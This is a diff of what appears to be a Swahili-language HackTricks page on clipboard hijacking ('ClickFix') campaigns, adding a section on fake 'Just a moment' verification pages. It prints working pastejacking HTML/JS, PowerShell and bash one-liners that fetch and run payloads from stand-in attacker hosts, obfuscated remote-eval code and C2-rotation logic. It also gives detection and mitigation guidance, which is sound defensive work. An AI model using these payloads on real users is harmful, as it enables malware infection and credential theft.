@@ -2,13 +2,13 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-> "Usibandike chochote usichokopia mwenyewe." – ushauri wa zamani lakini bado sahihi
+> "Usibandike chochote usichokikopi mwenyewe." – ushauri wa zamani lakini bado sahihi
 
 ## Muhtasari
 
-Clipboard hijacking – also known as *pastejacking* – hunufaisha ukweli kwamba watumiaji mara kwa mara wanakopa-na-kubandika amri bila kuziangalia. Ukurasa wa wavuti wenye madhara (au muktadha wowote unaoweza kukimbia JavaScript kama Electron au Desktop application) unaweka kwa njia ya programu maandishi yanayotawaliwa na mshambuliaji kwenye clipboard ya mfumo. Waathiriwa wanahimizwa, kawaida kwa maagizo ya social-engineering yaliyotengenezwa kwa uangalifu, kubonyeza **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell), au kufungua terminal na *kubandika* yaliyomo kwenye clipboard, na mara moja kuendesha amri yoyote.
+Clipboard hijacking – pia inayoitwa *pastejacking* – inatumia ukweli kwamba watumiaji kwa kawaida hunakili na kubandika amri bila kuzichunguza. Ukurasa wa wavuti mbaya (au muktadha wowote unaoweza kuendesha JavaScript kama Electron au Desktop application) kwa njia ya programu huweka maandishi yaliyodhibitiwa na mshambuliaji ndani ya clipboard ya mfumo. Waathiriwa huhimizwa, kawaida kwa maelekezo ya uhandisi wa kijamii yaliyotengenezwa kwa ustadi, kubonyeza **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell), au kufungua terminal na *bandika* yaliyomo kwenye clipboard, mara moja kutekeleza amri haribifu.
 
-Kwa sababu **hakuna faili inapakuliwa na hakuna kiambatanisho kinachofunguliwa**, mbinu hii hupita vikwazo vingi vya usalama vya barua pepe na yaliyomo kwenye wavuti vinavyotiwa nadharia kusimamia viambatanisho, macros au utekelezaji wa amri moja kwa moja. Kwa hivyo shambulio hili ni maarufu katika kampeni za phishing zinazowasilisha familia za malware za kawaida kama NetSupport RAT, Latrodectus loader au Lumma Stealer.
+Kwa sababu **hakuna faili inayopakuliwa na hakuna attachment inayofunguliwa**, mbinu hii inaepuka udhibiti mwingi wa usalama wa barua pepe na maudhui ya wavuti ambao hufuatilia attachments, macros au utekelezaji wa amri moja kwa moja. Kwa hiyo shambulio hili ni maarufu katika kampeni za phishing zinazowasilisha familia za malware za kawaida kama NetSupport RAT, Latrodectus loader au Lumma Stealer.
 
 ## JavaScript Uthibitisho wa Dhana
 ```html
@@ -22,15 +22,15 @@ navigator.clipboard.writeText(payload)
 }
 </script>
 ```
-Kampeni za zamani zilitumia `document.execCommand('copy')`, zile za baadaye hutegemea asynchronous **Clipboard API** (`navigator.clipboard.writeText`).
+Kampeni za zamani zilitumia `document.execCommand('copy')`, mpya zikitegemea **Clipboard API** isiyo sambamba (`navigator.clipboard.writeText`).
 
 ## The ClickFix / ClearFake Flow
 
-1. Mtumiaji anatembelea tovuti typosquatted au compromised (kwa mfano `docusign.sa[.]com`)
-2. Injected **ClearFake** JavaScript inaita helper `unsecuredCopyToClipboard()` ambayo kimya kimya inaweka PowerShell one-liner iliyofichwa kwa Base64 kwenye clipboard.
-3. Maelekezo ya HTML humuambia mwathiriwa: *“Bonyeza **Win + R**, bandika amri na bonyeza Enter ili kutatua tatizo.”*
-4. `powershell.exe` inaendesha, ikipakua archive inayojumuisha executable halali pamoja na DLL mbaya (classic DLL sideloading).
-5. Loader ina-decrypt hatua za ziada, inajaza shellcode na kusanidi persistence (kwa mfano scheduled task) – hatimaye ikiwasha NetSupport RAT / Latrodectus / Lumma Stealer.
+1. Mtumiaji anatembelea tovuti ya typosquatted au compromised (mfano `docusign.sa[.]com`)
+2. JavaScript ya **ClearFake** iliyotekewa inaita helper `unsecuredCopyToClipboard()` ambayo kwa ukimya inaweka Base64-encoded PowerShell one-liner kwenye clipboard.
+3. Maelekezo ya HTML yanaambia mwathiriwa: *“Bonyeza **Win + R**, bandika amri na bonyeza Enter kutatua tatizo.”*
+4. `powershell.exe` inaendesha, ikipakua archive inayojumuisha executable halali pamoja na DLL yenye madhara (classic DLL sideloading).
+5. Loader inafungua hatua za ziada (ina-decrypt), inaingiza shellcode na inasakinisha persistence (mfano scheduled task) — hatimaye ikiwasha NetSupport RAT / Latrodectus / Lumma Stealer.
 
 ### Example NetSupport RAT Chain
 ```powershell
@@ -40,35 +40,35 @@ Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
 Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
 %TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
 ```
-* `jp2launcher.exe` (Java WebStart halali) inatafuta `msvcp140.dll` katika saraka yake.
-* DLL hasidi inatatua APIs kwa wakati wa utekelezaji kwa kutumia **GetProcAddress**, inapakua binaries mbili (`data_3.bin`, `data_4.bin`) kupitia **curl.exe**, inazifumbua kwa kutumia ufunguo wa rolling XOR `"https://google.com/"`, inaingiza shellcode ya mwisho na inaifungua **client32.exe** (NetSupport RAT) kwa `C:\ProgramData\SecurityCheck_v1\`.
+* `jp2launcher.exe` (Java WebStart halali) inatafuta kwenye saraka yake faili `msvcp140.dll`.
+* DLL haribifu inapata APIs kwa wakati wa utekelezaji kwa kutumia **GetProcAddress**, inapakua binaries mbili (`data_3.bin`, `data_4.bin`) kupitia **curl.exe**, inazifungua kwa kutumia rolling XOR key `"https://google.com/"`, inaingiza shellcode ya mwisho na kuzipakua **client32.exe** (NetSupport RAT) hadi `C:\ProgramData\SecurityCheck_v1\`.
 
 ### Latrodectus Loader
 ```
 powershell -nop -enc <Base64>  # Cloud Identificator: 2031
 ```
 1. Inapakua `la.txt` kwa **curl.exe**
-2. Inaendesha JScript downloader ndani ya **cscript.exe**
-3. Inapata MSI payload → drops `libcef.dll` kando ya programu iliyosainiwa → DLL sideloading → shellcode → Latrodectus.
+2. Inakimbiza JScript downloader ndani ya **cscript.exe**
+3. Inapata MSI payload → inaweka `libcef.dll` kando ya signed application → DLL sideloading → shellcode → Latrodectus.
 
 ### Lumma Stealer kupitia MSHTA
 ```
 mshta https://iplogger.co/xxxx =+\\xxx
 ```
-Kiito cha **mshta** huanzisha script ya PowerShell iliyofichwa ambayo inapata `PartyContinued.exe`, hutoa `Boat.pst` (CAB), inajenga upya `AutoIt3.exe` kupitia `extrac32` na kuunganisha faili, na hatimaye inaendesha script ya `.a3x` ambayo exfiltrates browser credentials to `sumeriavgv.digital`.
+Kiito cha **mshta** kinaendesha script ya PowerShell iliyofichwa inayopakua `PartyContinued.exe`, inatoa `Boat.pst` (CAB), kujenga tena `AutoIt3.exe` kupitia `extrac32` na kuunganisha faili, na hatimaye inaendesha script ya `.a3x` ambayo inatoa kwa siri taarifa za kuingia za kivinjari kwa `sumeriavgv.digital`.
 
 ## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)
 
-Baadhi ya kampeni za ClickFix hupuuza downloads za faili kabisa na kuwashauri waathirika kubandika one‑liner that fetches and executes JavaScript via WSH, persists it, and rotates C2 daily. Mfano wa mnyororo uliotazamwa:
+Baadhi ya kampeni za ClickFix hupuuza kabisa upakuaji wa faili na kuwaamrisha waathirika kubandika mstari mmoja (one‑liner) unaopakua na kuendesha JavaScript kupitia WSH, kuufanya udumu, na kubadilisha C2 kila siku. Mfano wa mnyororo ulioshuhudiwa:
 ```powershell
 powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
 ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
 ```
 Sifa kuu
-- URL iliyofichwa iliyopindishwa wakati wa runtime ili kuzuia uchunguzi wa kawaida.
-- JavaScript hujiendeleza kupitia Startup LNK (WScript/CScript), na huchagua C2 kulingana na siku ya sasa – ikiruhusu mzunguko wa domain wa haraka.
+- URL iliyofichwa iliyorejeshwa kinyume wakati wa runtime ili kuzuia ukaguzi wa kawaida.
+- JavaScript inajidumu kupitia Startup LNK (WScript/CScript), na huchagua C2 kulingana na siku ya sasa — kuziwezesha domain rotation kwa kasi.
 
-Sehemu ndogo ya JS inayotumika kuzungusha C2s kulingana na tarehe:
+Fragment ndogo ya JS inayotumika kuzungusha C2s kwa tarehe:
 ```js
 function getURL() {
 var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
@@ -80,45 +80,114 @@ return 'https://'
 + '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
 }
 ```
-Hatua inayofuata kwa kawaida huweka loader ambayo inaanzisha persistence na kushusha RAT (mf., PureHVNC), mara nyingi ikifanya pinning ya TLS kwa hardcoded certificate na kugawanya traffic.
+Hatua inayofuata kwa kawaida hurusha loader inayoweka persistence na kuvuta RAT (mfano, PureHVNC), mara nyingi ikifunga TLS kwa hardcoded certificate na kukata traffic kwa vipande.
 
 Detection ideas specific to this variant
-- Process tree: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (or `cscript.exe`).
-- Startup artifacts: LNK in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` invoking WScript/CScript with a JS path under `%TEMP%`/`%APPDATA%`.
-- Registry/RunMRU and command‑line telemetry containing `.split('').reverse().join('')` or `eval(a.responseText)`.
-- Repeated `powershell -NoProfile -NonInteractive -Command -` with large stdin payloads to feed long scripts without long command lines.
-- Scheduled Tasks that subsequently execute LOLBins such as `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` under an updater‑looking task/path (e.g., `\GoogleSystem\GoogleUpdater`).
+- Mti wa mchakato: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (au `cscript.exe`).
+- Vielelezo vya kuanzisha: LNK katika `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` inayoita WScript/CScript na JS path chini ya `%TEMP%`/`%APPDATA%`.
+- Registry/RunMRU na telemetry ya mstari‑wa‑amri zenye `.split('').reverse().join('')` au `eval(a.responseText)`.
+- Kurudia `powershell -NoProfile -NonInteractive -Command -` zenye stdin payloads kubwa ili kuendesha scripts ndefu bila mistari ndefu ya amri.
+- Kazi Zilizopangwa (Scheduled Tasks) ambazo baadaye zinaendesha LOLBins kama `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` chini ya kazi/rajisi inayotokea kuwa updater (mfano, `\GoogleSystem\GoogleUpdater`).
 
-Uchunguzi wa tishio
-- Daily‑rotating C2 hostnames and URLs with `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>` pattern.
-- Changanisha clipboard write events zilizofuata na Win+R paste kisha kutekelezwa mara moja kwa `powershell.exe`.
+Threat hunting
+- Majina ya C2 yanayozunguka kila siku na URLs zenye muundo `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
+- Patanisha matukio ya kuandika clipboard ikifuatwa na Win+R paste kisha mara moja utekelezaji wa `powershell.exe`.
 
-Blue-teams wanaweza kuunganisha telemetry ya clipboard, process-creation na registry kutambua kwa usahihi matumizi mabaya ya pastejacking:
+Timu za blue zinaweza kuchanganya telemetry ya clipboard, uundaji wa mchakato na registry ili kubaini matumizi mabaya ya pastejacking:
 
-* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` inahifadhi historia ya **Win + R** amri – tazama kwa maingizo ya Base64 yasiyo ya kawaida / yaliyofichwa.
+* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` inahifadhi historia ya **Win + R** amri – tafuta entries zisizo za kawaida za Base64 / obfuscated.
 * Security Event ID **4688** (Process Creation) ambapo `ParentImage` == `explorer.exe` na `NewProcessName` katika { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
-* Event ID **4663** kwa uundaaji wa faili chini ya `%LocalAppData%\Microsoft\Windows\WinX\` au folda za muda kabla ya tukio la 4688 lenye shaka.
-* EDR clipboard sensors (if present) – changanisha `Clipboard Write` ikifuatiwa mara moja na mchakato mpya wa PowerShell.
+* Event ID **4663** kwa uundaji wa faili chini ya `%LocalAppData%\Microsoft\Windows\WinX\` au folda za muda kabla kabisa ya tukio la 4688 la kushukiwa.
+* EDR clipboard sensors (ikiwa zipo) – patanisha `Clipboard Write` ikifuatwa mara moja na mchakato mpya wa PowerShell.
 
-## Mitigations
+## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads
 
-1. Kuimarisha browser – zima clipboard write-access (`dom.events.asyncClipboard.clipboardItem` etc.) au hitaji ishara ya mtumiaji.
-2. Uhamasishaji wa usalama – fundisha watumiaji ku-*type* amri nyeti au kuzimimina kwanza kwenye text editor.
-3. PowerShell Constrained Language Mode / Execution Policy + Application Control ili kuzuia arbitrary one-liners.
-4. Udhibiti wa mtandao – ziba requests za outbound kwa domains za pastejacking zinazojulikana na C2 za malware.
+Kampeni za hivi karibuni zinazalisha kwa wingi kurasa za udanganyifu za CDN/browser za uthibitisho ("Just a moment…", IUAM-style) ambazo zinawalazimisha watumiaji kunakili amri maalum za OS kutoka clipboard yao na kuziweka kwenye native consoles. Hii inaondoa utekelezaji kutoka kwenye browser sandbox na inafanya kazi kwa Windows na macOS.
 
-## Related Tricks
+Key traits of the builder-generated pages
+- Ugundaji wa OS kupitia `navigator.userAgent` ili kubadilisha payloads (Windows PowerShell/CMD vs. macOS Terminal). Decoys/no-ops ya hiari kwa OS zisizotumika ili kudumisha udanganyifu.
+- Kunakili kwa clipboard moja kwa moja kwenye vitendo vya UI visivyo hatari (checkbox/Copy) wakati maandishi yanayoonekana yanaweza kutofautiana na yaliyomo kwenye clipboard.
+- Kuzuia mobile na popover yenye maelekezo hatua‑kwa‑hatua: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
+- Obfuscation ya hiari na injector ya single-file ili kuandika upya DOM ya tovuti iliyodukuliwa na verification UI yenye Tailwind styling (hakuna usajili mpya wa domain unahitajika).
 
-* **Discord Invite Hijacking** mara nyingi inatumia mbinu ile ile ya ClickFix baada ya kuvutwa kwa watumiaji kwenye server ya hatari:
+Mfano: clipboard mismatch + OS-aware branching
+```html
+<div class="space-y-2">
+<label class="inline-flex items-center space-x-2">
+<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
+</label>
+<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
+</div>
+<script>
+const ua = navigator.userAgent;
+const isWin = ua.includes('Windows');
+const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
+const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
+const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
+const shown = 'copy this: echo ok';            // benign-looking string on screen
+const real = isWin ? psWin : (isMac ? shMac : 'echo ok');
+
+function copyReal() {
+// UI shows a harmless string, but clipboard gets the real command
+navigator.clipboard.writeText(real).then(()=>{
+document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
+});
+}
+
+document.getElementById('chk').addEventListener('click', copyReal);
+</script>
+```
+macOS persistence ya utekelezaji wa awali
+- Tumia `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` ili utekelezaji uendelee baada ya terminal kufungwa, kupunguza athari zinazoonekana.
+
+In-place page takeover on compromised sites
+```html
+<script>
+(async () => {
+const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
+document.documentElement.innerHTML = html;                 // overwrite DOM
+const s = document.createElement('script');
+s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
+document.head.appendChild(s);
+})();
+</script>
+```
+Wazo za kugundua na kuwindia maalum kwa vishawishi vya mtindo wa IUAM
+- Web: Kurasa ambazo zinabind Clipboard API kwa verification widgets; kutokufanana kati ya maandishi yanayoonekana na clipboard payload; `navigator.userAgent` branching; Tailwind + single-page replace katika muktadha unaoshukuwa.
+- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` sekunde chache baada ya mwingiliano wa browser; batch/MSI installers zinazoendeshwa kutoka `%TEMP%`.
+- macOS endpoint: Terminal/iTerm zinazozalisha `bash`/`curl`/`base64 -d` zikiwa na `nohup` karibu na matukio ya browser; kazi za background zinazoendelea kufanya kazi baada ya kufunga terminal.
+- Changanisha historia ya `RunMRU` Win+R na maandishi ya clipboard na uundaji wa mchakato wa console uliofuata.
+
+See also for supporting techniques
+
+{{#ref}}
+clone-a-website.md
+{{#endref}}
+
+{{#ref}}
+homograph-attacks.md
+{{#endref}}
+
+## Kupunguza Hatari
+
+1. Kujenga usalama wa kivinjari – zima clipboard write-access (`dom.events.asyncClipboard.clipboardItem` etc.) au hitaji la ishara ya mtumiaji.
+2. Uhamasishaji wa usalama – fundisha watumiaji wa *kuandika* amri nyeti au kuzibandika kwanza kwenye mhariri wa maandishi.
+3. PowerShell Constrained Language Mode / Execution Policy + Application Control ili kuzuia one-liners zisizoidhinishwa.
+4. Udhibiti wa mtandao – zuia ombi za kutoka nje kwenda domain za pastejacking na malware C2 zinazojulikana.
+
+## Mbinu Zinazohusiana
+
+* **Discord Invite Hijacking** mara nyingi hutumia njia ile ile ya ClickFix baada ya kuwavutia watumiaji kwenye server hatarishi:
 
 {{#ref}}
 discord-invite-hijacking.md
 {{#endref}}
 
-## References
+## Marejeo
 
 - [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
 - [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
 - [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
+- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
 
 {{#include ../../banners/hacktricks-training.md}}
